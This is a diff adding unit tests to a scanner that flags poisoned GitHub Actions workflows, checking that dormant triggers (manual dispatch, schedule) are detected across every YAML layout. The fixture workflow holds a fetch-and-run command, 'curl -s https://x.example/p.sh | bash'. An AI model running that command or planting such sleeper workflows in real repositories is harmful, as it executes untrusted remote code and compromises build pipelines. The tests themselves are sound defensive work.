@@ -1922,6 +1922,43 @@ class TestGitHubActionsPoisoningScanning(unittest.TestCase):
             ]
             self.assertNotIn("dormant_trigger_with_payload", sig_types)
 
+    def _dormant_signal_types(self, on_block, tail=""):
+        content = (
+            "name: t\n" + on_block +
+            "jobs:\n  run:\n    runs-on: ubuntu-latest\n"
+            "    steps:\n      - run: curl -s https://x.example/p.sh | bash\n" + tail
+        )
+        d = self._build_workflow_diff(".github/workflows/sleeper.yml", content)
+        result = self._make_analyzer_with_diffs([d]).analyze()
+        self.assertNotIn("error", result)
+        return [s["type"] for wf in result["actions_poisoning"]["flagged_workflows"] for s in wf["signals"]]
+
+    def test_dormant_trigger_detected_in_every_yaml_layout(self):
+        """AUDIT_LOG §H2: the trigger was matched by line layout, so only `on:` followed by
+        `workflow_dispatch` on the next line counted. The same workflow written inline, as a
+        flow list or map, or with the trigger listed second carried no dormant-trigger signal."""
+        layouts = {
+            "block, first key": "on:\n  workflow_dispatch:\n",
+            "inline": "on: workflow_dispatch\n",
+            "flow list": "on: [push, workflow_dispatch]\n",
+            "flow map": "on: {workflow_dispatch: {}}\n",
+            "block, second key": "on:\n  push:\n  workflow_dispatch:\n",
+            "schedule, second key": "on:\n  push:\n  schedule:\n    - cron: '0 3 * * *'\n",
+            "quoted key": "\"on\":\n  workflow_dispatch:\n",
+        }
+        for name, on_block in layouts.items():
+            with self.subTest(layout=name):
+                self.assertIn("dormant_trigger_with_payload", self._dormant_signal_types(on_block))
+
+    def test_push_only_trigger_is_not_dormant(self):
+        self.assertNotIn("dormant_trigger_with_payload",
+                         self._dormant_signal_types("on: [push, pull_request]\n"))
+
+    def test_unparseable_workflow_keeps_line_pattern_detection(self):
+        # An unclosed flow sequence makes the YAML unparseable; the line pattern still matches.
+        self.assertIn("dormant_trigger_with_payload",
+                      self._dormant_signal_types("on:\n  workflow_dispatch:\n", tail="broken: [unclosed\n"))
+
     def test_forged_bot_author_detected(self):
         content = (
             "steps:\n  - run: |\n"
